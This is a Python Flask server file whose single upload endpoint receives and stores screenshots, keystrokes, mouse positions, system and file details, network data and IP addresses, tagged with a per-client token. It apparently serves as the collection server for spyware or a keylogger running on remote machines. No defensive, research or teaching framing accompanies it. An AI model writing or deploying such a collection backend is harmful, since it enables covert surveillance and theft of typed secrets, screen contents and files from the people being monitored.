# server.py
from flask import Flask, request, jsonify
import os, time, json, traceback

app = Flask(__name__)
UPLOAD_FOLDER = "uploads"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route("/upload", methods=["POST"])
def upload_file():
    try:
        token = request.form.get("token")
        mouse_x = request.form.get("mouse_x")
        mouse_y = request.form.get("mouse_y")
        timestamp = request.form.get("timestamp", str(int(time.time())))
        system = request.form.get("system")
        files_meta = request.form.get("files")
        keys = request.form.get("keys")
        network = request.form.get("network")
        local_ip = request.form.get("local_ip")
        public_ip = request.form.get("public_ip")

        f = request.files.get("screenshot")
        app_log_file = request.files.get("app_log")

        if not f:
            return jsonify({"ok": False, "error": "no screenshot provided"}), 400

        base_name = f"{timestamp}_{token}".replace(" ", "_")
        img_name = base_name + ".png"
        img_path = os.path.join(UPLOAD_FOLDER, img_name)
        f.save(img_path)

        meta = {
            "token": token,
            "mouse_x": mouse_x,
            "mouse_y": mouse_y,
            "timestamp": timestamp,
            "system": None,
            "files": None,
            "keys": None,
            "network": None,
            "local_ip": local_ip,
            "public_ip": public_ip
        }
        try:
            if system:
                meta["system"] = json.loads(system) if (system.startswith("{") or system.startswith("[")) else system
        except Exception:
            meta["system"] = system

        try:
            if files_meta:
                meta["files"] = json.loads(files_meta)
        except Exception:
            meta["files"] = files_meta

        try:
            if keys:
                meta["keys"] = json.loads(keys)
        except Exception:
            meta["keys"] = keys

        try:
            if network:
                meta["network"] = json.loads(network)
        except Exception:
            meta["network"] = network

        meta_path = os.path.join(UPLOAD_FOLDER, base_name + ".meta.json")
        with open(meta_path, "w", encoding="utf-8") as mf:
            json.dump(meta, mf, ensure_ascii=False, indent=2)

        if app_log_file:
            log_name = base_name + ".app.log.txt"
            log_path = os.path.join(UPLOAD_FOLDER, log_name)
            app_log_file.save(log_path)
            print(f"Saved app log: {log_path}")

        print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Saved {img_path} and meta {meta_path}")
        return jsonify({"ok": True, "saved": img_name, "meta": os.path.basename(meta_path)})
    except Exception as e:
        traceback.print_exc()
        return jsonify({"ok": False, "error": str(e)}), 500

if __name__ == "__main__":
    # local geliştirme: 127.0.0.1
    app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)

